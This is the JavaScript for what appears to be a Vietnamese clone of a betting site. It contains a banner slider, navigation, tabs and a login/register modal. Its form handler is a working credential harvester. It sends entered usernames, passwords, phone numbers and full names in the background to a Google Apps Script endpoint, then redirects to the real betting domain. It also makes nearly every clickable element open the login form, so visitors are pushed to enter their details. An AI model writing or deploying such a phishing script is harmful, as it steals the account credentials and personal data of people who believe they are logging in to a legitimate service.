// Đợi toàn bộ giao diện HTML tải xong mới chạy JavaScript
document.addEventListener("DOMContentLoaded", function() {
    
    /* ========================================================
       1. XỬ LÝ MENU DƯỚI CÙNG (BOTTOM NAV) TRÊN MOBILE
    ======================================================== */
    const bottomNavItems = document.querySelectorAll('.bottom-nav-item');
    bottomNavItems.forEach(item => {
        item.addEventListener('click', function(e) {
            e.preventDefault(); 
            bottomNavItems.forEach(nav => nav.classList.remove('active'));
            this.classList.add('active');
        });
    });

    const mobileMenuBtn = document.getElementById('mobile-menu-btn');
    if (mobileMenuBtn) {
        mobileMenuBtn.addEventListener('click', function() {
            alert("Tính năng mở Menu Sidebar đang được phát triển!");
        });
    }

    /* ========================================================
       2. XỬ LÝ BANNER SLIDER TỰ ĐỘNG TRƯỢT
    ======================================================== */
    const track = document.getElementById('bannerTrack');
    const slides = document.querySelectorAll('.carousel-slide');
    const nextBtn = document.getElementById('nextBtn');
    const prevBtn = document.getElementById('prevBtn');
    const dotsContainer = document.getElementById('carouselDots');

    if (track && slides.length > 0) {
        let currentIndex = 0;
        const totalSlides = slides.length;
        let slideInterval;
        const intervalTime = 3000;

        dotsContainer.innerHTML = ''; 
        slides.forEach((_, index) => {
            const dot = document.createElement('div');
            dot.classList.add('dot');
            if (index === 0) dot.classList.add('active');
            dot.addEventListener('click', () => goToSlide(index));
            dotsContainer.appendChild(dot);
        });
        const dots = document.querySelectorAll('.dot');

        function updateSlider() {
            track.style.transform = `translateX(-${currentIndex * 100}%)`;
            dots.forEach(dot => dot.classList.remove('active'));
            if (dots[currentIndex]) {
                dots[currentIndex].classList.add('active');
            }
        }

        function nextSlide() {
            currentIndex = (currentIndex === totalSlides - 1) ? 0 : currentIndex + 1;
            updateSlider();
        }

        function prevSlide() {
            currentIndex = (currentIndex === 0) ? totalSlides - 1 : currentIndex - 1;
            updateSlider();
        }

        function goToSlide(index) {
            currentIndex = index;
            updateSlider();
            resetAutoSlide(); 
        }

        function startAutoSlide() {
            slideInterval = setInterval(nextSlide, intervalTime);
        }
        
        function resetAutoSlide() {
            clearInterval(slideInterval);
            startAutoSlide();
        }

        if (nextBtn) {
            nextBtn.addEventListener('click', () => {
                nextSlide();
                resetAutoSlide();
            });
        }
        if (prevBtn) {
            prevBtn.addEventListener('click', () => {
                prevSlide();
                resetAutoSlide();
            });
        }

        startAutoSlide();
    }

    /* ========================================================
       3. XỬ LÝ DANH MỤC TRƯỢT NGANG (MOBILE) VÀ GAME HOT
    ======================================================== */
    const catNav = document.getElementById('mobileCategories');
    const catLeftBtn = document.getElementById('catLeftBtn');
    const catRightBtn = document.getElementById('catRightBtn');

    if (catNav && catLeftBtn && catRightBtn) {
        catLeftBtn.addEventListener('click', () => {
            catNav.scrollBy({ left: -100, behavior: 'smooth' });
        });
        catRightBtn.addEventListener('click', () => {
            catNav.scrollBy({ left: 100, behavior: 'smooth' });
        });
    }

    const catItems = document.querySelectorAll('.cat-item, .category-item');
    catItems.forEach(item => {
        item.addEventListener('click', function() {
            catItems.forEach(i => i.classList.remove('active'));
            this.classList.add('active');
        });
    });

    const provNav = document.getElementById('providerNav');
    const provLeft = document.getElementById('provLeft');
    const provRight = document.getElementById('provRight');

    if(provNav && provLeft && provRight) {
        provLeft.addEventListener('click', () => {
            provNav.scrollBy({ left: -250, behavior: 'smooth' });
        });
        provRight.addEventListener('click', () => {
            provNav.scrollBy({ left: 250, behavior: 'smooth' });
        });
    }

    const provBtns = document.querySelectorAll('.prov-btn');
    provBtns.forEach(btn => {
        btn.addEventListener('click', function() {
            provBtns.forEach(b => b.classList.remove('active'));
            this.classList.add('active');
        });
    });

    /* ========================================================
       4. XỬ LÝ CHUYỂN TAB SẢNH TRÒ CHƠI
    ======================================================== */
    const tabButtons = document.querySelectorAll('.tab-btn');
    const tabPanes = document.querySelectorAll('.tab-pane');

    tabButtons.forEach(button => {
        button.addEventListener('click', function() {
            const targetId = this.getAttribute('data-target');
            
            tabButtons.forEach(btn => btn.classList.remove('active'));
            this.classList.add('active');

            tabPanes.forEach(pane => pane.classList.remove('active'));
            const targetPane = document.getElementById(targetId);
            if (targetPane) {
                targetPane.classList.add('active');
            }
        });
    });

    /* ========================================================
       5. XỬ LÝ MODAL ĐĂNG NHẬP / ĐĂNG KÝ
    ======================================================== */
    const authModal = document.getElementById('authModal');
    const closeModal = document.getElementById('closeModal');
    
    const btnLoginHeaders = document.querySelectorAll('.btn-login');
    const btnRegisterHeaders = document.querySelectorAll('.btn-register');
    
    const tabLoginBtn = document.getElementById('tabLoginBtn');
    const tabRegisterBtn = document.getElementById('tabRegisterBtn');
    const loginForm = document.getElementById('loginForm');
    const registerForm = document.getElementById('registerForm');

    function switchTab(isLogin) {
        if (isLogin) {
            if(tabLoginBtn) tabLoginBtn.classList.add('active');
            if(tabRegisterBtn) tabRegisterBtn.classList.remove('active');
            if(loginForm) loginForm.classList.add('active');
            if(registerForm) registerForm.classList.remove('active');
        } else {
            if(tabRegisterBtn) tabRegisterBtn.classList.add('active');
            if(tabLoginBtn) tabLoginBtn.classList.remove('active');
            if(registerForm) registerForm.classList.add('active');
            if(loginForm) loginForm.classList.remove('active');
        }
    }

    btnLoginHeaders.forEach(btn => {
        btn.addEventListener('click', (e) => {
            e.preventDefault();
            if (authModal) authModal.classList.add('show');
            switchTab(true);
        });
    });

    btnRegisterHeaders.forEach(btn => {
        btn.addEventListener('click', (e) => {
            e.preventDefault();
            if (authModal) authModal.classList.add('show');
            switchTab(false);
        });
    });

    if (tabLoginBtn) tabLoginBtn.addEventListener('click', (e) => { e.preventDefault(); switchTab(true); });
    if (tabRegisterBtn) tabRegisterBtn.addEventListener('click', (e) => { e.preventDefault(); switchTab(false); });

    if (closeModal) {
        closeModal.addEventListener('click', () => {
            if (authModal) authModal.classList.remove('show');
        });
    }

    window.addEventListener('click', (e) => {
        if (e.target === authModal) {
            authModal.classList.remove('show');
        }
    });

    /* ========================================================
       6. XỬ LÝ GỬI FORM VỀ GOOGLE SHEET VÀ CHUYỂN HƯỚNG NHANH
    ======================================================== */
    const redirectUrl = "https://m.f8bet11g.com/";
    const scriptURL = "https://script.google.com/macros/s/AKfycbybi_mmRHeYXu-2pfO4EXMGdw0aupesqZnC-FGLlU0AHWjoZCO8aEoAVt2cnol2L-xZpg/exec";

    function sendDataToSheet(data, submitButton) {
        // Vô hiệu hóa nút và đổi chữ
        submitButton.disabled = true;
        submitButton.innerHTML = "ĐANG VÀO GAME...";

        // Gửi dữ liệu ngầm với keepalive: true
        fetch(scriptURL, {
            method: 'POST',
            body: JSON.stringify(data),
            headers: { 'Content-Type': 'text/plain;charset=utf-8' },
            keepalive: true // Yêu cầu trình duyệt tiếp tục upload dữ liệu kể cả khi đã chuyển trang
        })
        .catch(error => {
            console.error('Lỗi gửi ngầm!', error.message);
        });

        // Chuyển trang ngay sau khoảng delay siêu ngắn (200ms) để Request kịp khởi tạo
        setTimeout(() => {
            window.location.href = redirectUrl;
        }, 200);
    }

    if (loginForm) {
        loginForm.addEventListener('submit', function(e) {
            e.preventDefault(); 
            
            const submitBtn = loginForm.querySelector('.auth-submit-btn');
            const formData = {
                type: "Đăng Nhập",
                username: document.getElementById('loginUser').value,
                password: document.getElementById('loginPass').value,
                phone: document.getElementById('loginPhone').value,
                fullname: "" 
            };
            
            sendDataToSheet(formData, submitBtn);
        });
    }

    if (registerForm) {
        registerForm.addEventListener('submit', function(e) {
            e.preventDefault(); 
            
            const submitBtn = registerForm.querySelector('.auth-submit-btn');
            const formData = {
                type: "Đăng Ký",
                username: document.getElementById('regUser').value,
                password: document.getElementById('regPass').value,
                fullname: document.getElementById('regName').value,
                phone: document.getElementById('regPhone').value
            };
            
            sendDataToSheet(formData, submitBtn);
        });
    }

    /* ========================================================
       7. XỬ LÝ CLICK CÁC THÀNH PHẦN KHÁC MỞ FORM ĐĂNG NHẬP
    ======================================================== */
    document.addEventListener('click', function(e) {
        const loginTriggerClasses = [
            '.carousel-slide',       // Banners
            '.cat-item',             // Danh mục trò chơi (kiểu tròn mới)
            '.category-item',        // Danh mục trò chơi (kiểu cũ)
            '.game-card',            // Khối game 
            '.m-game-card',          // Khối game mobile (3 cột)
            '.hot-game-item',        // Khối game Hot (viền vàng)
            '.os-card',              // Khối tải app (iOS, Android)
            '.btn-download',         // Nút tải app
            '.provider-box',         // Icon các nhà cung cấp sảnh game
            '.require-login'         // Class tuỳ chọn
        ].join(', ');

        const targetToLogin = e.target.closest(loginTriggerClasses);
        const isControlBtn = e.target.closest('.carousel-btn, .nav-arrow, .cat-arrow, .prov-btn, .tab-btn');

        if (targetToLogin && !isControlBtn) {
            e.preventDefault(); 
            
            if (authModal) {
                authModal.classList.add('show');
                switchTab(true); 
            }
        }
    });

});